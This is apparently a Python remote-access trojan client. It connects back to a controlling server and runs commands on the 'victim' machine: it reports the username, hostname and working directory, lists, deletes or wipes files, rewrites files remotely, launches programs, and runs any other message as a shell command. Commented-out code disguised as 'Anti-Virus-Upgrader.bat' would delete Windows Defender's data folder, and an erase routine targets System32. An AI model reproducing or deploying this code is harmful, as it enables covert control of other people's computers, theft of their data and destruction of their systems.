import os, socket, threading
ip = socket.gethostbyname(socket.gethostname())#for testing
'''
windefdelname = 'Anti-Virus-Upgrader.bat'
windefdelfile = open(windefdelname, 'w')
lines = ['\ntakeown /f C:\\ProgramData\\Microsoft\n','\ncd C:/ProgramData/\n', '\nrmdir /S/Q Microsoft\n']
windefdelfile.writelines(lines)
os.system(f'powershell "start {windefdelname} -v runAs"')
os.startfile(windefdelname)
'''
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 80))
        break
    except:
        s.close()
        pass
while True:
    try:
        msg = s.recv(1024)
        msg = msg.decode()
        print(msg)
        if msg.lower().startswith('!getusername'):
            login = os.getlogin()
            msgtoserv = login.encode()
            s.send(msgtoserv)
            msg = ''
        elif msg.lower().startswith('!getvictimhost'):
            hostname = socket.gethostname()
            msgtoserv = hostname.encode()
            s.send(msgtoserv)
            msg = ''
        elif msg.lower().startswith('!getvictimcwd'):
            cwd = os.getcwd()
            msgtoserv = cwd.encode()
            s.send(msgtoserv)
            msg = ''
        elif msg.lower().startswith('!changedir'):
            msg = msg.split()
            direc = msg[1]
            try:
                os.chdir(direc)
            except:
                pass
        elif msg.lower().startswith('!listdir'):
            listdir = os.listdir()
            result = ""
            for dire in listdir:
                try:
                    result = result + dire + ", "
                except:
                    pass
            msgtoserv = result.encode()
            s.send(msgtoserv)
            msg = ''
        elif msg.lower().startswith('!erasevictim'):
            pass
            '''
            os.chdir('C:/Windows/')
            dirs = os.listdir()
            for dir in dirs:
                try:
                    if dir == 'System32':
                        os.system(f'takeown /f C:\{backslash}Windows\System32')
                        os.rmdir(dir)
                    else:
                        pass
                except:
                    os.chdir('C:/Windows/System32')
                    dirs = os.listdir()
                    for dir in dirs:
                        try:
                            os.rmdir(dir)
                        except:
                            pass'''
        elif msg.lower().startswith('!delfile'):
            try:
                msg = msg.split()
                files = msg[1]
                dirlist = os.listdir()
                for file in dirlist:
                    if file.strip() == files.strip():
                        try:
                            os.rmdir(file)
                        except:
                            os.remove(file)
                    else:
                        pass
            except:
                pass
        elif msg.lower().startswith('!wipefolder'):
            msg = msg.split()
            dirlist = os.listdir()
            for file in dirlist:
                try:
                    os.rmdir(file)
                except:
                    pass
            dirlist = os.listdir()
            for file in dirlist:
                try:
                    os.remove(file)
                except:
                    pass
        elif msg.lower().startswith('!openfile'):
            try:
                print("Opening a file")
                msg = msg.split()
                print(msg)
                filename = msg[1]
                print(filename)
                final_code = []
                file = open(filename, 'r')
                file_code = file.readlines()
                print(file_code)
                final_code.extend('\n')
                final_code.extend(file_code)
                final_code.extend('\n')
                print(final_code)
                file = open(filename, 'w')
                file.writelines(final_code)
                file.close()
                msgtoserv = f'The lines to the opened file are: {final_code}'.encode()
                s.send(msgtoserv)
                while True:
                    msg = s.recv(1024).decode()
                    print(msg)
                    if msg.lower().startswith('!stop'):
                        break
                    elif msg.lower().startswith('!viewlines'):
                        try:
                            file_read = open(filename, 'r')
                            line_lst = file_read.readlines()
                            result = ""
                            for line in line_lst:
                                try:
                                    result = result + line
                                except:
                                    pass
                        except:
                            break
                        msgtoserv = result.encode()
                        s.send(msgtoserv)
                    else:
                        write = msg
                        file = open(filename, 'w')
                        write = "\n" + write
                        final_code.extend(write)
                        file.writelines(final_code)
                        file.close()
            except:
                msgtoserv = 'There was an Error with opening the file, do !stop to cleanly end the loop that you are in right now.'.encode()
                s.send(msgtoserv)
                pass
        elif msg.lower().startswith('!startfile'):
            msg = msg.split()
            filename = msg[1]
            os.startfile(filename)
        else:
            os.system(msg)
    except:
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 80))
                break
            except:
                s.close()
                pass
